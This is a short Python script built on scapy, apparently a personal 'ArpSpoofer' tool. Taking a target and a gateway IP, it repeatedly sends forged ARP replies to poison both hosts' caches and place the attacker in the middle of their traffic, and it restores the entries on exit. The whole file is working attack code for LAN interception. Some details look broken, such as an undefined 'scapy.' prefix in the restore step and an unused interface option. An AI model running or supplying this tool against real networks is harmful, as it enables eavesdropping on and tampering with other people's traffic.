#!/bin/python3

from scapy.all import *
import argparse
import time
import sys
import os

def parse_arguments():
    parser = argparse.ArgumentParser(description="This is my ArpSpoofer")
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Set the interface")
    parser.add_argument("-t", "--target", dest="target", required=True, help="Set a target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway", required=True, help="Set a gateway IP address")
    parser.add_argument("-s", "--sleep", dest="sleep", type=int, default=2, help="Set sleep time in seconds")
    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

def spoofing(target_ip, spoof_ip):
    target_mac = getmacbyip(target_ip)
    if target_mac is None:
        print(f"[-] Could not find mac address to IP address: {target_ip}")
        return
    packet = ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    if destination_mac is None or source_mac is None:
        print(f"Could not find mac address to destination/source IP address")
        return
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, verbose=False)

def main():
    args = parse_arguments()

    interface = args.interface
    target_ip = args.target
    gateway_ip = args.gateway
    pause = args.sleep
    verb = args.verbose
    
    try:
        while True:
            print("[*] Start of ArpSpoofing")
            spoofing(target_ip, gateway_ip)
            spoofing(gateway_ip, target_ip)
            time.sleep(pause)
    except KeyboardInterrupt:
        print("[*] A key combination \"Ctrl+C\" has been pressed")
        time.sleep(2)
        print("[*] Please wait...Recovery in process")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

if __name__ == "__main__":
    main()
